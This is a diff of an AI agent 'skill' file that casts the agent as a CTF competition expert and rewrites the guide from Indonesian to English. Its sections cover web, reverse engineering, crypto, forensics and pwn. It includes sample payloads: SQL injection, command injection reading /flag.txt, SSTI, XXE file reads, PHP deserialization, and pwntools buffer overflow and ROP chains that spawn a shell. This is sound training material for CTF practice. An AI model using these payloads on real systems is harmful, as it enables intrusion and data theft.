@@ -7,172 +7,283 @@ description: "Expert Capture The Flag competition including web exploitation, re
 
 ## Overview
 
-Skill ini menjadikan AI Agent Anda sebagai spesialis CTF (Capture The Flag) competition. Agent akan mampu menyelesaikan berbagai kategori challenge: Web, Pwn (Binary Exploitation), Reverse Engineering, Cryptography, Forensics, dan OSINT dengan strategi dan tools yang tepat.
+This skill transforms you into a **CTF Competition Expert**. You will master **Web Exploitation**, **Reverse Engineering**, **Cryptography**, **Forensics**, and **Binary Exploitation** for solving CTF challenges.
 
 ## When to Use This Skill
 
-- Use when solving CTF challenges in competitions
-- Use when practicing security skills through CTF platforms
-- Use when the user asks about CTF methodology
-- Use when learning reverse engineering or exploitation
-- Use when analyzing binary files or cryptographic puzzles
+- Use when competing in CTF competitions
+- Use when practicing security skills
+- Use when solving hacking challenges
+- Use when learning new exploitation techniques
+- Use when training for security certifications
 
-## How It Works
+---
 
-### Step 1: CTF Categories
+## Part 1: CTF Categories
 
-```text
-┌─────────────────────────────────────────────────────────┐
-│                   CTF CATEGORIES                        │
-├─────────────────────────────────────────────────────────┤
-│ 🌐 WEB       - SQL injection, XSS, SSTI, deserialization│
-│ 🔓 CRYPTO    - RSA, AES, hashing, custom ciphers        │
-│ 🔍 FORENSICS - Disk, memory, network, steganography     │
-│ ⚙️ REVERSING - Binary analysis, decompilation           │
-│ 💥 PWN       - Buffer overflow, ROP, heap exploitation  │
-│ 🌍 OSINT     - Open source intelligence gathering       │
-│ 🧩 MISC      - Programming, trivia, unconventional      │
-└─────────────────────────────────────────────────────────┘
-```
+### 1.1 Challenge Types
 
-### Step 2: Essential Tools
+| Category | Focus |
+|----------|-------|
+| **Web** | SQL injection, XSS, SSRF, auth bypass |
+| **Pwn (Binary)** | Buffer overflow, ROP, heap exploitation |
+| **Reverse** | Disassembly, decompilation, logic analysis |
+| **Crypto** | Classic ciphers, RSA, AES, hash attacks |
+| **Forensics** | File analysis, memory dumps, network captures |
+| **Misc** | OSINT, programming, steganography |
 
-#### Web Challenges
+### 1.2 Popular CTF Platforms
 
-```bash
-# Burp Suite for request manipulation
-# SQLMap for SQL injection
-sqlmap -u "http://target.com/page?id=1" --dbs
+| Platform | Focus |
+|----------|-------|
+| **picoCTF** | Beginner-friendly |
+| **HackTheBox** | Realistic machines |
+| **TryHackMe** | Guided learning |
+| **CTFtime** | Competition calendar |
+| **OverTheWire** | Wargames |
 
-# SSTI detection
-{{7*7}}  # If returns 49, SSTI confirmed
-${7*7}   # Alternative syntax
-```
+---
 
-#### Crypto Challenges
+## Part 2: Web Challenges
+
+### 2.1 Common Vulnerabilities
 
 ```python
-# RSA with small e (common CTF scenario)
+# SQL Injection
+' OR '1'='1
+' UNION SELECT 1,2,3,flag FROM flags--
+
+# Command Injection
+; cat /flag.txt
+$(cat /flag.txt)
+`cat /flag.txt`
+
+# SSTI (Server-Side Template Injection)
+{{7*7}}
+{{config}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///flag.txt">
+]>
+<data>&xxe;</data>
+
+# Deserialization (PHP)
+O:8:"UserData":1:{s:4:"file";s:10:"/flag.txt";}
+```
+
+### 2.2 Tools
+
+| Tool | Purpose |
+|------|---------|
+| **Burp Suite** | Request manipulation |
+| **sqlmap** | Automated SQLi |
+| **dirb/ffuf** | Directory brute force |
+| **curl** | Manual requests |
+
+---
+
+## Part 3: Reverse Engineering
+
+### 3.1 Workflow
+
+```
+File Analysis → Disassembly → Decompilation → Logic Analysis → Solve
+```
+
+### 3.2 Tools
+
+| Tool | Purpose |
+|------|---------|
+| **Ghidra** | Free decompiler |
+| **IDA Pro** | Industry standard |
+| **radare2/Cutter** | Open source |
+| **GDB + pwndbg** | Dynamic analysis |
+| **strings** | Extract strings |
+
+### 3.3 Common Techniques
+
+```bash
+# Basic analysis
+file challenge
+strings challenge | grep flag
+ltrace ./challenge
+strace ./challenge
+
+# Ghidra decompilation
+# Look for main(), strcmp(), password checks
+```
+
+---
+
+## Part 4: Cryptography
+
+### 4.1 Classic Ciphers
+
+| Cipher | Identification |
+|--------|----------------|
+| **Caesar** | Letter frequency preserved |
+| **Vigenère** | Repeating key patterns |
+| **Base64** | Ends with = or == |
+| **ROT13** | A-M ↔ N-Z |
+| **XOR** | If key is short, frequency analysis |
+
+### 4.2 RSA Attacks
+
+```python
+# Small e attack (e=3)
 from Crypto.Util.number import long_to_bytes
 import gmpy2
 
-# If e=3 and c < n, try cube root
-m = gmpy2.iroot(c, 3)[0]
+c = <ciphertext>
+e = 3
+m = gmpy2.iroot(c, e)[0]
 print(long_to_bytes(m))
 
-# Frequency analysis for substitution cipher
-from collections import Counter
-freq = Counter(ciphertext)
+# Wiener attack (small d)
+# Factor n when p and q are close
 ```
 
-#### Forensics Challenges
+### 4.3 Tools
 
 ```bash
-# File identification
-file mystery_file
-binwalk mystery_file
+# Online
+CyberChef (decode/encode)
+dCode.fr (classic ciphers)
+factordb.com (factor n)
 
-# Extract hidden files
-binwalk -e mystery_file
-foremost -i mystery_file
+# Python
+from Crypto.Cipher import AES
+from Crypto.Util.number import *
+import hashlib
+```
 
-# Steganography
+---
+
+## Part 5: Forensics
+
+### 5.1 File Analysis
+
+```bash
+# Identify file type
+file mystery
+xxd mystery | head -20
+binwalk mystery
+
+# Extract hidden data
+binwalk -e mystery
+foremost mystery
 steghide extract -sf image.jpg
-zsteg image.png
-strings image.jpg | grep -i flag
 
 # Memory forensics
-volatility -f memory.dmp imageinfo
-volatility -f memory.dmp --profile=Win7SP1x64 pslist
+volatility -f memdump.raw imageinfo
+volatility -f memdump.raw --profile=Win7SP1x64 pslist
 ```
 
-#### Reverse Engineering
+### 5.2 Network Forensics
 
 ```bash
-# Static analysis
-strings binary
-objdump -d binary
-ghidra binary  # GUI decompiler
+# Wireshark filters
+http contains "flag"
+tcp.stream eq 5
 
-# Dynamic analysis
-ltrace ./binary
-strace ./binary
-gdb ./binary
+# Extract files
+File → Export Objects → HTTP
+
+# Command line
+tshark -r capture.pcap -Y "http" -T fields -e http.file_data
 ```
 
-#### Binary Exploitation (Pwn)
+---
+
+## Part 6: Pwn (Binary Exploitation)
+
+### 6.1 Buffer Overflow
 
 ```python
 from pwn import *
 
-# Connect to challenge
-p = remote('challenge.ctf.com', 1337)
+# Find offset
+cyclic(200)
+# Crash at 0x61616165 → cyclic_find(0x61616165)
 
-# Buffer overflow payload
-payload = b'A' * offset
-payload += p64(win_function_addr)
+# Ret2win (call win function)
+payload = b'A' * offset + p64(win_address)
 
+# Shell using pwntools
+p = process('./challenge')
 p.sendline(payload)
 p.interactive()
 ```
 
-### Step 3: Common Patterns
+### 6.2 ROP Chain
 
-| Category | Common Pattern | Solution Approach |
-|----------|----------------|-------------------|
-| Web | robots.txt, .git exposed | Check for hidden files |
-| Crypto | RSA small e | Cube root attack |
-| Forensics | PNG with extra data | binwalk extraction |
-| Reversing | strcmp with flag | Strings or debug |
-| Pwn | gets() function | Buffer overflow |
+```python
+from pwn import *
 
-### Step 4: CTF Platforms for Practice
+elf = ELF('./challenge')
+rop = ROP(elf)
 
-```text
-Beginner:
-├── PicoCTF (https://picoctf.org)
-├── OverTheWire (https://overthewire.org)
-└── TryHackMe (https://tryhackme.com)
+# Find gadgets
+rop.call('system', [next(elf.search(b'/bin/sh'))])
 
-Intermediate:
-├── HackTheBox (https://hackthebox.com)
-├── Root-Me (https://root-me.org)
-└── CryptoHack (https://cryptohack.org)
-
-Advanced:
-├── pwnable.kr / pwnable.tw
-├── Exploit Education (https://exploit.education)
-└── CTFtime (https://ctftime.org) - Live competitions
+payload = b'A' * offset + rop.chain()
 ```
 
-## Best Practices
+---
+
+## Part 7: CTF Toolkit
+
+### 7.1 Essential Setup
+
+```bash
+# Install pwntools
+pip install pwntools
+
+# Install Ghidra
+wget https://github.com/NationalSecurityAgency/ghidra/releases/...
+
+# SecLists
+git clone https://github.com/danielmiessler/SecLists
+
+# RsaCtfTool
+git clone https://github.com/RsaCtfTool/RsaCtfTool
+```
+
+### 7.2 Quick Reference
+
+| Task | Command/Tool |
+|------|--------------|
+| Decode Base64 | `echo "..." \| base64 -d` |
+| Find strings | `strings -n 10 file` |
+| Hex dump | `xxd file` |
+| Decompile | Ghidra / IDA |
+| Network | Wireshark / tshark |
+| Web | Burp Suite |
+| Binary | pwntools + GDB |
+
+---
+
+## Part 8: Best Practices Checklist
 
 ### ✅ Do This
 
-- ✅ Read the challenge description carefully—hints are often there
-- ✅ Check file metadata and strings first
-- ✅ Keep notes and writeups of solved challenges
-- ✅ Collaborate with teammates on different categories
-- ✅ Automate repetitive tasks with scripts
+- ✅ **Read the Challenge Carefully**: Hints in description.
+- ✅ **Start with Easy Points**: Build momentum.
+- ✅ **Take Notes**: Document your approach.
 
 ### ❌ Avoid This
 
-- ❌ Don't overthink—start with simple approaches
-- ❌ Don't spend too long on one challenge—move on and return
-- ❌ Don't ignore the obvious (check source code, robots.txt)
-- ❌ Don't forget to URL decode / base64 decode flags
+- ❌ **Tunnel Vision**: If stuck, switch challenges.
+- ❌ **Over-Automating**: Sometimes manual is faster.
+- ❌ **Not Checking Write-ups**: After CTF ends, learn from others.
 
-## Common Pitfalls
-
-**Problem:** Stuck on a challenge
-**Solution:** Take a break, check CTF Discord/IRC for hints, or try a different category.
-
-**Problem:** Binary won't run locally
-**Solution:** Check architecture (32/64-bit), use Docker or VM with same environment.
+---
 
 ## Related Skills
 
-- `@senior-penetration-tester` - Real-world pen testing
-- `@malware-analyst` - Reverse engineering malware
-- `@forensic-investigator` - Digital forensics deep dive
-- `@red-team-operator` - Offensive security operations
+- `@senior-penetration-tester` - Real-world testing
+- `@malware-analyst` - Reverse engineering
+- `@forensic-investigator` - Forensics deep dive
